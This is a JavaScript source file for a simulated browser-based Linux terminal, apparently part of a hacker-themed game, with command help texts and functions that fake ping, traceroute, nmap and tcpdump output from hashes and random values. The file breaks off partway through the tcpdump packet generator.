import {
    getDirectory,
    getFile,
    getItem,
    listDirectory,
    changeDirectory,
    readFile,
    createFile,
    createDirectory,
    deleteItem,
    resolvePath,
    generateTimestamp,
    environment,
    switchUser,
    exitUser,
    addUser,
    canUseSudo,
    verifyPassword,
    getUserInfo,
    addToHistory,
    getCurrentHistory,
    setCurrentHistory,
    resetToInitialUser
} from './filesystem.js';



// ============================================================================
// COMMAND HELP TEXTS
// ============================================================================

const commandHelp = {
    ls: `Usage: ls [OPTION]... [FILE]...
List information about the FILEs (the current directory by default).

  -a, --all       do not ignore entries starting with .
  -l              use a long listing format
  -h, --help      display this help and exit`,

    cd: `Usage: cd [DIR]
Change the current directory to DIR.

  cd            go to home directory
  cd ~          go to home directory
  cd -          go to previous directory
  cd ..         go to parent directory`,

    cat: `Usage: cat [FILE]...
Concatenate FILE(s) to standard output.

  -h, --help    display this help and exit`,

    pwd: `Usage: pwd
Print the name of the current working directory.`,

    echo: `Usage: echo [STRING]...
Display a line of text.

  \\n    new line`,

    clear: `Usage: clear
Clear the terminal screen.`,

    whoami: `Usage: whoami
Print the current user name.`,

    date: `Usage: date
Display the current date and time.`,

    uname: `Usage: uname [OPTION]...
Print system information.

  -a    print all information`,

    ping: `Usage: ping [OPTION] DESTINATION
Send ICMP ECHO_REQUEST to network hosts.

  -c COUNT    stop after sending COUNT packets`,

    traceroute: `Usage: traceroute HOST
Print the route packets trace to network host.`,

    nmap: `Usage: nmap [Scan Type] [Options] {target}
Network exploration tool and security scanner.

  -sV           probe open ports to determine service/version info
  -p PORT       scan specified ports
  -A            enable OS detection, version detection, script scanning`,

    ssh: `Usage: ssh [user@]hostname
OpenSSH remote login client.

  ssh hostname              connect as current user
  ssh user@hostname         connect as specified user`,

    scp: `Usage: scp [OPTION] source... target
Secure copy (remote file copy program).

  scp file user@host:path   copy file to remote host
  scp user@host:file path   copy file from remote host`,

    grep: `Usage: grep [OPTION]... PATTERN [FILE]...
Search for PATTERN in each FILE.

  -i            ignore case distinctions
  -v            invert match: select non-matching lines

Examples:
  grep "error" log.txt           search for "error" in log.txt
  grep -i "error" log.txt        case-insensitive search
  grep -v "debug" log.txt        show lines NOT containing "debug"
  cat file.txt | grep "pattern"  search piped input`,

    find: `Usage: find [PATH] [EXPRESSION]
Search for files in a directory hierarchy.

  -name PATTERN     search for files matching PATTERN
  -type TYPE        search by type (f=file, d=directory)`,

    head: `Usage: head [OPTION]... [FILE]...
Print the first 10 lines of each FILE.

  -n NUM    print the first NUM lines`,

    tail: `Usage: tail [OPTION]... [FILE]...
Print the last 10 lines of each FILE.

  -n NUM    print the last NUM lines`,

    touch: `Usage: touch FILE...
Update the access and modification times of each FILE to the current time.
A FILE argument that does not exist is created empty.`,

    chmod: `Usage: chmod MODE FILE...
Change the file mode bits. (Simulated)`,

    chown: `Usage: chown OWNER[:GROUP] FILE...
Change file owner and group. (Simulated)`,

    more: `Usage: more [FILE]...
File perusal filter for viewing.

  SPACE     display next screen
  q         quit`,

    less: `Usage: less [FILE]...
Opposite of more - view file contents with scrolling.

  SPACE     display next screen
  q         quit`,

    curl: `Usage: curl [OPTIONS] URL
Transfer data from or to a server.

  -o FILE       write output to FILE
  -X METHOD     specify request method (GET, POST, etc.)`,

    wget: `Usage: wget [OPTION]... [URL]...
Non-interactive network downloader.

  -O FILE       write documents to FILE`,

    tar: `Usage: tar [OPTION]... [FILE]...
Archive utility.

  -c    create a new archive
  -x    extract files from an archive
  -v    verbose output
  -f    use archive file
  -z    filter through gzip`,

    gzip: `Usage: gzip [OPTION]... [FILE]...
Compress or decompress files.

  -d    decompress`,

    history: `Usage: history
Display command history.`,

    export: `Usage: export NAME=VALUE
Set environment variables.`,

    env: `Usage: env
Print environment variables.`,

    ps: `Usage: ps [OPTIONS]
Report a snapshot of current processes.

  aux     show all processes`,

    top: `Usage: top
Display Linux processes. Press 'q' to quit.`,

    ifconfig: `Usage: ifconfig
Configure network interfaces.`,

    netstat: `Usage: netstat
Print network connections and routing tables.`,

    route: `Usage: route
Show / manipulate the IP routing table.`,

    iptables: `Usage: iptables [OPTIONS]
Administration tool for IPv4 packet filtering.`,

    whois: `Usage: whois DOMAIN
Client for the whois directory service.`,

    nslookup: `Usage: nslookup HOST
Query Internet name servers.`,

    hostname: `Usage: hostname
Show or set the system's hostname.`,

    apt: `Usage: apt [OPTIONS] COMMAND
Package management utility.

  update        update package lists
  upgrade       upgrade installed packages
  install PKG   install a package
  remove PKG    remove a package`,

    dpkg: `Usage: dpkg [OPTIONS] ACTION
Package manager for Debian.

  -l           list installed packages
  -i FILE      install a package
  -r PKG       remove a package`,

    nc: `Usage: nc [OPTIONS] HOST PORT
Netcat - networking utility for reading/writing network connections.

  -l           listen mode
  -v           verbose output`,

    base64: `Usage: base64 [OPTION]... [FILE]
Base64 encode or decode FILE, or standard input.

  -d, --decode    decode data
  -h, --help      display this help and exit`,

    md5sum: `Usage: md5sum [FILE]...
Print MD5 checksums.`,

    sha256sum: `Usage: sha256sum [FILE]...
Print SHA256 checksums.`,

    strings: `Usage: strings [FILE]...
Print the sequences of printable characters in files.`,

    john: `Usage: john [OPTIONS] [PASSWORD-FILES]
John the Ripper password cracker.

  --wordlist=FILE    use FILE as wordlist
  --show             show cracked passwords`,

    hashcat: `Usage: hashcat [OPTIONS] HASH [DICTIONARY]
Advanced password recovery utility.

  -m TYPE    hash type (0=MD5, 100=SHA1, etc.)
  -a MODE    attack mode`,

    dig: `Usage: dig [@server] [name] [type]
DNS lookup utility.`,

    host: `Usage: host [OPTIONS] NAME [SERVER]
DNS lookup utility.`,

    arp: `Usage: arp [OPTIONS]
Manipulate the system ARP cache.

  -a    display all entries`,

    telnet: `Usage: telnet HOST [PORT]
User interface to the TELNET protocol.`,

    openssl: `Usage: openssl COMMAND [OPTIONS]
OpenSSL command line tool.

  enc         encoding with ciphers
  dgst        message digests
  genrsa      generate RSA keys
  rsa         RSA key management`,

    su: `Usage: su [USER]
Change user ID or become superuser.

  su          become root
  su USER     become USER`,

    sudo: `Usage: sudo [OPTIONS] COMMAND
Execute a command as another user.

  -u USER     run as specified USER
  sudo su     become root`,

    which: `Usage: which COMMAND
Locate a command.`,

    useradd: `Usage: useradd [OPTIONS] USERNAME
Create a new user account.

  -m    create home directory`,

    w: `Usage: w
Show who is logged on and what they are doing.`,

    who: `Usage: who
Show who is logged on.`,

    exit: `Usage: exit
Exit the current shell or SSH session.`,

    bash: `Usage: bash
GNU Bourne-Again SHell.`,

    iwconfig: `Usage: iwconfig [INTERFACE]
Configure wireless network interfaces.`,

    tcpdump: `Usage: tcpdump [OPTIONS]
Dump traffic on a network. (Simulated)`,
};

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

// generateTimestamp is imported from filesystem.js

function hashString(str) {
    let hash = 0;
    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i);
        hash = hash & hash;
    }
    return hash;
}

function expandVariables(inputString) {
    return inputString.replace(/\$([a-zA-Z_][a-zA-Z0-9_]*)/g, (match, varName) => {
        return environment[varName] !== undefined ? environment[varName] : '';
    });
}

/**
 * Recursively expand glob patterns like *, ?, and multi-level patterns like *\/*\/*
 * @param {string} pattern - The glob pattern (e.g., "*\/*", "*\/*\/*")
 * @param {string} currentDir - Current working directory
 * @param {boolean} showHidden - Whether to show hidden files
 * @returns {string[]} - Array of matching paths
 */
function expandGlobPattern(pattern, currentDir, showHidden = false) {
    // Resolve the pattern relative to currentDir
    const absolutePattern = pattern.startsWith('/') ? pattern : resolvePath(pattern, currentDir);

    // Split pattern into segments
    const segments = absolutePattern.split('/').filter(seg => seg !== '');

    // Start from root
    const startPath = absolutePattern.startsWith('/') ? '/' : currentDir;

    // Recursively expand each segment
    function expandSegments(basePath, remainingSegments, isLastSegment = false) {
        if (remainingSegments.length === 0) {
            return [basePath];
        }

        const currentSegment = remainingSegments[0];
        const restSegments = remainingSegments.slice(1);
        const isLast = restSegments.length === 0;

        // If no wildcards in this segment, just continue
        if (!currentSegment.includes('*') && !currentSegment.includes('?')) {
            // Fix double slash issue: properly join paths
            const newPath = basePath === '/' ? `/${currentSegment}` : `${basePath}/${currentSegment}`;
            return expandSegments(newPath, restSegments, isLast);
        }

        // Get directory contents
        const dir = getDirectory(basePath);
        if (!dir || !dir.contents) {
            return [];
        }

        // Convert glob pattern to regex
        const regex = new RegExp('^' + currentSegment.replace(/\*/g, '.*').replace(/\?/g, '.') + '$');

        // Find all matching items
        const matches = Object.keys(dir.contents).filter(name => {
            if (!showHidden && name.startsWith('.')) return false;
            return regex.test(name);
        });

        // If this is the last segment with wildcards, return the matches directly
        // Don't try to descend into them
        if (isLast) {
            const results = [];
            for (const match of matches) {
                const newPath = basePath === '/' ? `/${match}` : `${basePath}/${match}`;
                results.push(newPath);
            }
            return results;
        }

        // Recursively expand for each match (only for directories)
        const results = [];
        for (const match of matches) {
            // Fix double slash issue: properly join paths
            const newPath = basePath === '/' ? `/${match}` : `${basePath}/${match}`;

            // Only continue expansion if this is a directory
            const item = dir.contents[match];
            if (item && item.type === 'directory') {
                const expanded = expandSegments(newPath, restSegments, restSegments.length === 1);
                results.push(...expanded);
            }
        }

        return results;
    }

    // Handle special case for root patterns like /*
    if (absolutePattern.startsWith('/') && segments.length > 0) {
        return expandSegments('/', segments, segments.length === 1);
    } else if (segments.length > 0) {
        return expandSegments(currentDir, segments, segments.length === 1);
    }

    return [absolutePattern];
}

function isValidPingTarget(target) {
    const ipv4Regex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
    const hostnameRegex = /^[a-zA-Z0-9.-]+\.(com|net|org|gov|edu|io|co|uk|dev|app)$/i;
    return ipv4Regex.test(target) || hostnameRegex.test(target);
}

function calculateMdev(times, avg) {
    if (times.length < 2) return 0;
    const sumOfSquares = times.reduce((sum, time) => sum + Math.pow(time - avg, 2), 0);
    return Math.sqrt(sumOfSquares / times.length);
}

// ============================================================================
// DNS CACHE SYSTEM
// ============================================================================

// Persistent DNS cache to ensure consistent IP addresses for hostnames
const dnsCache = {};

// SSH-enabled hosts (hosts where port 22 is open)
const sshEnabledHosts = new Set();

// Well-known hosts with realistic public IPs
const knownHosts = {
    'google.com': '142.250.185.46',
    'www.google.com': '142.250.185.46',
    'github.com': '140.82.121.4',
    'www.github.com': '140.82.121.4',
    'stackoverflow.com': '151.101.1.69',
    'www.stackoverflow.com': '151.101.1.69',
    'wikipedia.org': '208.80.154.224',
    'www.wikipedia.org': '208.80.154.224',
    'reddit.com': '151.101.65.140',
    'www.reddit.com': '151.101.65.140',
    'amazon.com': '205.251.242.103',
    'www.amazon.com': '205.251.242.103',
    'facebook.com': '157.240.241.35',
    'www.facebook.com': '157.240.241.35',
    'youtube.com': '142.250.185.78',
    'www.youtube.com': '142.250.185.78',
    'twitter.com': '104.244.42.193',
    'www.twitter.com': '104.244.42.193',
    'linkedin.com': '108.174.10.10',
    'www.linkedin.com': '108.174.10.10',
    'microsoft.com': '20.112.52.29',
    'www.microsoft.com': '20.112.52.29',
    'apple.com': '17.253.144.10',
    'www.apple.com': '17.253.144.10',
    'cloudflare.com': '104.16.132.229',
    'www.cloudflare.com': '104.16.132.229',
    'netflix.com': '54.74.73.31',
    'www.netflix.com': '54.74.73.31'
};

// Generate a consistent public IP for a hostname using a hash
function generatePublicIP(hostname) {
    // Use a simple hash function for consistency
    let hash = 0;
    for (let i = 0; i < hostname.length; i++) {
        hash = ((hash << 5) - hash) + hostname.charCodeAt(i);
        hash = hash & hash; // Convert to 32-bit integer
    }

    // Generate IP avoiding private ranges (10.x.x.x, 172.16-31.x.x, 192.168.x.x)
    // Use public IP ranges
    const ranges = [
        { min: [1, 0, 0, 0], max: [9, 255, 255, 255] },          // 1.x - 9.x
        { min: [11, 0, 0, 0], max: [126, 255, 255, 255] },       // 11.x - 126.x
        { min: [128, 0, 0, 0], max: [172, 15, 255, 255] },       // 128.x - 172.15.x
        { min: [172, 32, 0, 0], max: [191, 255, 255, 255] },     // 172.32.x - 191.255.x
        { min: [193, 0, 0, 0], max: [223, 255, 255, 255] }       // 193.x - 223.x
    ];

    const absHash = Math.abs(hash);
    const rangeIndex = absHash % ranges.length;
    const range = ranges[rangeIndex];

    // Generate each octet based on hash
    const octet1 = range.min[0] + (absHash % (range.max[0] - range.min[0] + 1));
    const octet2 = (absHash >> 8) % 256;
    const octet3 = (absHash >> 16) % 256;
    const octet4 = (absHash >> 24) % 256;

    return `${octet1}.${octet2}.${octet3}.${octet4}`;
}

// Resolve hostname to IP address (consistent across all network commands)
function resolveHostname(hostname) {
    // If it's already an IP, return it
    const ipv4Regex = /^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/;
    if (ipv4Regex.test(hostname)) {
        return hostname;
    }

    // Check if it's a known host
    if (knownHosts[hostname]) {
        return knownHosts[hostname];
    }

    // Check cache
    if (dnsCache[hostname]) {
        return dnsCache[hostname];
    }

    // Generate and cache new IP
    const ip = generatePublicIP(hostname);
    dnsCache[hostname] = ip;
    return ip;
}

// Reverse DNS lookup - find hostname for an IP
function reverseResolve(ip) {
    // Check known hosts (reverse lookup)
    for (const [hostname, knownIP] of Object.entries(knownHosts)) {
        if (knownIP === ip) {
            return hostname;
        }
    }

    // Check cache (reverse lookup)
    for (const [hostname, cachedIP] of Object.entries(dnsCache)) {
        if (cachedIP === ip) {
            return hostname;
        }
    }

    // No hostname found for this IP
    return null;
}

// ============================================================================
// OUTPUT GENERATORS (for complex commands)
// ============================================================================

async function generatePingOutput(args, outputElement, terminalInnerContent, terminalBody, redirectToFile = false) {
    let target = '';
    let count = 4;

    const cIndex = args.indexOf('-c');
    if (cIndex !== -1 && args.length > cIndex + 1) {
        const countArg = parseInt(args[cIndex + 1], 10);
        if (!isNaN(countArg)) {
            count = countArg;
        }
    }

    for (let i = 1; i < args.length; i++) {
        if (args[i] !== '-c' && (cIndex === -1 || i !== cIndex + 1)) {
            target = args[i];
            break;
        }
    }

    if (!target) {
        const msg = 'Usage: ping [-c count] <hostname or IP>';
        if (redirectToFile) return msg;
        outputElement.textContent = msg;
        return;
    }

    if (!isValidPingTarget(target)) {
        const msg = `ping: cannot resolve ${target}: Unknown host`;
        if (redirectToFile) return msg;
        outputElement.textContent = msg;
        terminalBody.scrollTop = terminalBody.scrollHeight;
        return;
    }

    // Resolve hostname to consistent IP
    const resolvedIP = resolveHostname(target);

    // Generate ping time based on IP for consistency
    let hash = 0;
    for (let i = 0; i < resolvedIP.length; i++) {
        hash = ((hash << 5) - hash) + resolvedIP.charCodeAt(i);
        hash = hash & hash;
    }

    const baseTime = 20 + Math.abs(hash % 50);
    const pingTimes = [];

    // Collect output lines
    let outputLines = [];
    const headerLine = `PING ${target} (${resolvedIP}) 56(84) bytes of data.`;
    outputLines.push(headerLine);

    if (!redirectToFile) {
        outputElement.textContent = headerLine;
        terminalBody.scrollTop = terminalBody.scrollHeight;
    }

    let i;
    for (i = 1; i <= count; i++) {
        if (window.isCommandInterrupted) break;
        await new Promise(resolve => setTimeout(resolve, 1000));
        if (window.isCommandInterrupted) break;

        const timeVariation = (Math.random() * 6 - 3);
        const pingTime = Math.max(1, (baseTime + timeVariation));
        pingTimes.push(pingTime);

        const pingLineText = `64 bytes from ${target} (${resolvedIP}): icmp_seq=${i} ttl=64 time=${pingTime.toFixed(1)} ms`;
        outputLines.push(pingLineText);

        if (!redirectToFile) {
            const pingLine = document.createElement('div');
            pingLine.className = 'tk-terminal-output';
            pingLine.textContent = pingLineText;
            terminalInnerContent.appendChild(pingLine);
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }
    }

    await new Promise(resolve => setTimeout(resolve, 500));

    const packetsTransmitted = window.isCommandInterrupted ? i - 1 : count;
    const packetsReceived = pingTimes.length;
    const packetLoss = packetsTransmitted > 0 ? ((packetsTransmitted - packetsReceived) / packetsTransmitted * 100).toFixed(0) : 0;
    const totalTime = pingTimes.reduce((sum, time) => sum + time, 0).toFixed(0);

    const minRtt = pingTimes.length > 0 ? Math.min(...pingTimes).toFixed(3) : '0.000';
    const maxRtt = pingTimes.length > 0 ? Math.max(...pingTimes).toFixed(3) : '0.000';
    const avgRtt = pingTimes.length > 0 ? (pingTimes.reduce((sum, time) => sum + time, 0) / pingTimes.length).toFixed(3) : '0.000';
    const mdev = calculateMdev(pingTimes, parseFloat(avgRtt)).toFixed(3);

    outputLines.push('');
    outputLines.push(`--- ${target} ping statistics ---`);
    outputLines.push(`${packetsTransmitted} packets transmitted, ${packetsReceived} received, ${packetLoss}% packet loss, time ${totalTime}ms`);
    outputLines.push(`rtt min/avg/max/mdev = ${minRtt}/${avgRtt}/${maxRtt}/${mdev} ms`);

    if (!redirectToFile) {
        const stats1 = document.createElement('div');
        stats1.className = 'tk-terminal-output';
        stats1.textContent = '';
        terminalInnerContent.appendChild(stats1);

        const stats2 = document.createElement('div');
        stats2.className = 'tk-terminal-output';
        stats2.textContent = `--- ${target} ping statistics ---`;
        terminalInnerContent.appendChild(stats2);

        const stats3 = document.createElement('div');
        stats3.className = 'tk-terminal-output';
        stats3.textContent = `${packetsTransmitted} packets transmitted, ${packetsReceived} received, ${packetLoss}% packet loss, time ${totalTime}ms`;
        terminalInnerContent.appendChild(stats3);

        const stats4 = document.createElement('div');
        stats4.className = 'tk-terminal-output';
        stats4.textContent = `rtt min/avg/max/mdev = ${minRtt}/${avgRtt}/${maxRtt}/${mdev} ms`;
        terminalInnerContent.appendChild(stats4);
    }

    // Return text output for file redirection
    if (redirectToFile) {
        return outputLines.join('\n');
    }
}

async function generateTracerouteOutput(target, terminalInnerContent, terminalBody, redirectToFile = false) {
    if (!isValidPingTarget(target)) {
        const msg = `traceroute: unknown host ${target}`;
        if (redirectToFile) return msg;
        const output = document.createElement('div');
        output.className = 'tk-terminal-output';
        output.textContent = msg;
        terminalInnerContent.appendChild(output);
        terminalBody.scrollTop = terminalBody.scrollHeight;
        return;
    }

    // Resolve hostname to consistent IP
    const resolvedIP = resolveHostname(target);

    let hash = 0;
    for (let i = 0; i < resolvedIP.length; i++) {
        hash = ((hash << 5) - hash) + resolvedIP.charCodeAt(i);
        hash = hash & hash;
    }

    // Collect output lines
    let outputLines = [];
    const headerLine = `traceroute to ${target} (${resolvedIP}), 30 hops max, 60 byte packets`;
    outputLines.push(headerLine);

    if (!redirectToFile) {
        const output = document.createElement('div');
        output.className = 'tk-terminal-output';
        output.textContent = headerLine;
        terminalInnerContent.appendChild(output);
        terminalBody.scrollTop = terminalBody.scrollHeight;
    }

    // Check if destination is on local network (192.168.1.x)
    const isLocalNetwork = resolvedIP.startsWith('192.168.1.');
    const numHops = isLocalNetwork ? 1 : (8 + Math.abs(hash % 7));

    // Generate realistic internet route
    const destOctets = resolvedIP.split('.').map(Number);

    for (let i = 1; i <= numHops; i++) {
        if (window.isCommandInterrupted) break;
        await new Promise(resolve => setTimeout(resolve, 800));
        if (window.isCommandInterrupted) break;

        let hopLineText;
        let hopIP;
        let hostname = null;

        if (isLocalNetwork) {
            // For local network destinations, show direct route
            hopIP = resolvedIP;
            hostname = target !== resolvedIP ? target : null;
        } else if (i === 1) {
            // First hop: local gateway (192.168.1.1)
            hopIP = '192.168.1.1';
            hostname = 'gateway';
        } else if (i === 2) {
            // Second hop: ISP router (10.x.x.x private address from ISP)
            hopIP = `10.${50 + Math.abs(hash % 50)}.${Math.abs(hash % 256)}.1`;
            hostname = `isp-router-${Math.abs(hash % 100)}`;
        } else if (i === 3) {
            // Third hop: ISP core router
            hopIP = `66.${Math.abs(hash % 256)}.${Math.abs((hash >> 8) % 256)}.${1 + Math.abs(hash % 254)}`;
            hostname = `core${Math.abs(hash % 10)}.isp.net`;
        } else if (i < numHops - 2) {
            // Middle hops: internet backbone routers (various public IPs)
            const backboneProviders = [
                { prefix: '4.', name: 'level3' },      // Level 3 Communications
                { prefix: '12.', name: 'att' },        // AT&T
                { prefix: '129.', name: 'cogent' },    // Cogent
                { prefix: '174.', name: 'cogent' },    // Cogent
                { prefix: '154.', name: 'telia' },     // Telia
                { prefix: '80.', name: 'telia' },      // Telia
                { prefix: '209.', name: 'qwest' }      // Qwest/CenturyLink
            ];

            const provider = backboneProviders[Math.abs((hash + i) % backboneProviders.length)];
            const octet1 = parseInt(provider.prefix);
            hopIP = `${octet1}.${Math.abs((hash + i * 7) % 256)}.${Math.abs((hash + i * 13) % 256)}.${1 + Math.abs((hash + i * 17) % 254)}`;
            hostname = `${provider.name}-${Math.abs((hash + i) % 100)}.backbone.net`;
        } else if (i === numHops - 2) {
            // Penultimate hop: destination network edge
            hopIP = `${destOctets[0]}.${destOctets[1]}.${Math.abs((hash + i) % 256)}.${1 + Math.abs(hash % 254)}`;
            hostname = null;
        } else if (i === numHops - 1) {
            // Second to last hop: destination network router
            hopIP = `${destOctets[0]}.${destOctets[1]}.${destOctets[2]}.${1 + Math.abs(hash % 254)}`;
            hostname = null;
        } else {
            // Final hop: actual destination
            hopIP = resolvedIP;
            hostname = target !== resolvedIP ? target : null;
        }

        // Generate realistic round-trip times (increasing with distance)
        const times = [];
        for (let j = 0; j < 3; j++) {
            const baseTime = 5 + i * 8 + Math.random() * 15;
            times.push(baseTime.toFixed(1));
        }

        // Format the hop line
        if (hostname) {
            hopLineText = ` ${i}  ${hostname} (${hopIP})  ${times[0]} ms  ${times[1]} ms  ${times[2]} ms`;
        } else {
            hopLineText = ` ${i}  ${hopIP}  ${times[0]} ms  ${times[1]} ms  ${times[2]} ms`;
        }

        outputLines.push(hopLineText);

        if (!redirectToFile) {
            const hopLine = document.createElement('div');
            hopLine.className = 'tk-terminal-output';
            hopLine.textContent = hopLineText;
            terminalInnerContent.appendChild(hopLine);
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }
    }

    // Return text output for file redirection
    if (redirectToFile) {
        return outputLines.join('\n');
    }
}

function generateNmapOutput(target) {
    // Resolve hostname to consistent IP (or use IP if already provided)
    const resolvedIP = resolveHostname(target);

    // Try reverse DNS lookup if target was an IP
    const hostname = reverseResolve(resolvedIP) || target;

    // Check if target is a domain name (has a dot and TLD)
    const isDomain = /^[a-zA-Z0-9.-]+\.(com|net|org|gov|edu|io|co|uk|dev|app)$/i.test(hostname);

    let hash = 0;
    for (let i = 0; i < resolvedIP.length; i++) {
        hash = ((hash << 5) - hash) + resolvedIP.charCodeAt(i);
        hash = hash & hash;
    }

    const openPorts = new Set();

    // Check if hostname contains special keywords - always add SSH
    const specialKeywords = ['gibson', 'hacker', 'matrix', 'wargames', 'wopr', 'fsociety', 'ecorp', 'allsafe', 'evilcorp'];
    const isSpecialHost = specialKeywords.some(keyword => hostname.toLowerCase().includes(keyword));

    // If it's a valid domain/website, ALWAYS have port 80 (HTTP) open
    if (isDomain) {
        openPorts.add(80);
        // Most domains also have HTTPS (443)
        if (Math.abs(hash % 10) > 2) { // 70% chance
            openPorts.add(443);
        }
    }

    // Add other realistic ports based on hash (consistent for same IP)
    // SSH - more common (40% chance, or always if special host)
    if (isSpecialHost || hash % 5 <= 1) {
        openPorts.add(22);
        sshEnabledHosts.add(hostname.toLowerCase());
        sshEnabledHosts.add(resolvedIP);
    }
    if (hash % 7 === 0 && !isDomain) openPorts.add(443); // HTTPS (if not already added)
    if (hash % 11 === 0) openPorts.add(21);  // FTP
    if (hash % 13 === 0) openPorts.add(25);  // SMTP
    if (hash % 17 === 0) openPorts.add(53);  // DNS
    if (hash % 19 === 0) openPorts.add(3306); // MySQL
    if (hash % 23 === 0) openPorts.add(8080); // HTTP-alt
    if (hash % 29 === 0) openPorts.add(3389); // RDP
    if (hash % 31 === 0) openPorts.add(5432); // PostgreSQL
    if (hash % 37 === 0) openPorts.add(27017); // MongoDB
    if (hash % 41 === 0) openPorts.add(6379); // Redis

    // Ensure at least one port is open
    if (openPorts.size === 0) openPorts.add(22);

    const openPortsArray = Array.from(openPorts).sort((a, b) => a - b);

    let output = `Starting Nmap 7.80 ( https://nmap.org ) at ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n`;
    output += `Nmap scan report for ${hostname} (${resolvedIP})\n`;
    output += `Host is up (0.00${Math.abs(hash % 9) + 1}s latency).\n`;
    output += `Not shown: ${1000 - openPortsArray.length} closed ports\n`;
    output += 'PORT      STATE SERVICE\n';

    for (const port of openPortsArray) {
        let service = 'unknown';
        switch(port) {
            case 21: service = 'ftp'; break;
            case 22: service = 'ssh'; break;
            case 25: service = 'smtp'; break;
            case 53: service = 'domain'; break;
            case 80: service = 'http'; break;
            case 110: service = 'pop3'; break;
            case 143: service = 'imap'; break;
            case 443: service = 'https'; break;
            case 993: service = 'imaps'; break;
            case 995: service = 'pop3s'; break;
            case 3306: service = 'mysql'; break;
            case 3389: service = 'ms-wbt-server'; break;
            case 5432: service = 'postgresql'; break;
            case 6379: service = 'redis'; break;
            case 8080: service = 'http-proxy'; break;
            case 27017: service = 'mongod'; break;
        }
        output += `${port}/tcp   open  ${service}\n`;
    }

    output += '\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds';
    return output;
}

async function generateTcpdumpOutput(args, createFile, currentDirectory, terminalInnerContent, terminalBody) {
    // Check if user is root
    if (environment.USER !== 'root') {
        return 'tcpdump: eth0: You don\'t have permission to capture on that device\n(socket: Operation not permitted)';
    }

    // Parse arguments
    let writeFile = null;
    let iface = 'eth0'; // 'interface' is a reserved word in JavaScript
    let packetCount = null; // null means infinite until Ctrl+C

    const wIndex = args.indexOf('-w');
    if (wIndex !== -1 && args.length > wIndex + 1) {
        writeFile = args[wIndex + 1];
    }

    const iIndex = args.indexOf('-i');
    if (iIndex !== -1 && args.length > iIndex + 1) {
        iface = args[iIndex + 1];
    }

    const cIndex = args.indexOf('-c');
    if (cIndex !== -1 && args.length > cIndex + 1) {
        packetCount = parseInt(args[cIndex + 1], 10);
        if (isNaN(packetCount) || packetCount <= 0) {
            return 'tcpdump: invalid packet count';
        }
    }

    // Track connection state for more realistic sequences
    let connectionState = {};
    let lastTimestamp = Date.now();

    // Generate realistic packet data
    const generatePacket = (seq) => {
        // Realistic timestamp with microsecond progression
        const now = Date.now();
        const elapsed = now - lastTimestamp;
        lastTimestamp = now;

        const date = new Date();
        const hours = date.getHours().toString().padStart(2, '0');
        const minutes = date.getMinutes().toString().padStart(2, '0');
        const seconds = date.getSeconds().toString().padStart(2, '0');
        const microseconds = (date.getMilliseconds() * 1000 + Math.floor(Math.random() * 1000)).toString().padStart(6, '0');
        const timestamp = `${hours}:${minutes}:${seconds}.${microseconds}`;

        // Varied packet types
        const packetType = Math.random();

        if (packetType < 0.05) {
            // ARP packet (5%)
            const srcMAC = `00:0c:29:${Math.floor(Math.random() * 256).toString(16).padStart(2, '0')}:${Math.floor(Math.random() * 256).toString(16).padStart(2, '0')}:${Math.floor(Math.random() * 256).toString(16).padStart(2, '0')}`;
            const srcIP = `192.168.1.${100 + Math.floor(Math.random() * 50)}`;
            const dstIP = `192.168.1.${100 + Math.floor(Math.random() * 50)}`;
            return `${timestamp} ARP, Request who-has ${dstIP} tell ${srcIP}, length 28`;
        } else if (packetType < 0.08) {
            // DNS query (3%)
            const srcIP = `192.168.1.${100 + Math.floor(Math.random() * 50)}`;
            const srcPort = 30000 + Math.floor(Math.random() * 35000);
            const queryId = Math.floor(Math.random() * 65535);
            const domains = ['google.com', 'github.com', 'api.example.com', 'cdn.cloudflare.com', 'www.amazon.com'];
            const domain = domains[Math.floor(Math.random() * domains.length)];
            return `${timestamp} IP ${srcIP}.${srcPort} > 8.8.8.8.53: ${queryId}+ A? ${domain}. (${28 + domain.length})`;
        } else if (packetType < 0.11) {
            // DNS response (3%)
            const dstIP = `192.168.1.${100 + Math.floor(Math.random() * 50)}`;
            const dstPort = 30000 + Math.floor(Math.random() * 35000);
            const queryId = Math.floor(Math.random() * 65535);
            const ip = `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
            return `${timestamp} IP 8.8.8.8.53 > ${dstIP}.${dstPort}: ${queryId} 1/0/0 A ${ip} (44)`;
        } else if (packetType < 0.13) {
            // ICMP packet (2%)
            const srcIP = `192.168.1.${100 + Math.floor(Math.random() * 50)}`;
            const dstIP = `8.8.8.8`;
            const icmpSeq = Math.floor(Math.random() * 1000);
            return `${timestamp} IP ${srcIP} > ${dstIP}: ICMP echo request, id ${Math.floor(Math.random() * 65535)}, seq ${icmpSeq}, length 64`;
        } else {
            // TCP packet (87%)
            const srcIP = `192.168.1.${100 + Math.floor(Math.random() * 50)}`;
            const dstIP = Math.random() > 0.3 ? `192.168.1.${100 + Math.floor(Math.random() * 50)}` : `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;

            // Common service ports with weighted distribution
            const portRand = Math.random();
            let dstPort;
            if (portRand < 0.4) dstPort = 443;      // HTTPS 40%
            else if (portRand < 0.6) dstPort = 80;   // HTTP 20%
            else if (portRand < 0.75) dstPort = 22;  // SSH 15%
            else if (portRand < 0.85) dstPort = 53;  // DNS 10%
            else if (portRand < 0.92) dstPort = 8080; // HTTP-alt 7%
            else dstPort = [21, 25, 110, 143, 3306, 5432, 6379, 27017][Math.floor(Math.random() * 8)]; // Others 8%

            const srcPort = 1024 + Math.floor(Math.random() * 64000);
            const connKey = `${srcIP}:${srcPort}-${dstIP}:${dstPort}`;

            // Initialize connection state if needed
            if (!connectionState[connKey]) {
                connectionState[connKey] = {
                    seq: Math.floor(Math.random() * 4000000000),
                    ack: Math.floor(Math.random() * 4000000000),
                    state: 'ESTABLISHED'
                };
            }

            const conn = connectionState[connKey];

            // Determine packet characteristics based on state
            let flags, seqStart, seqEnd, ack, win, length;
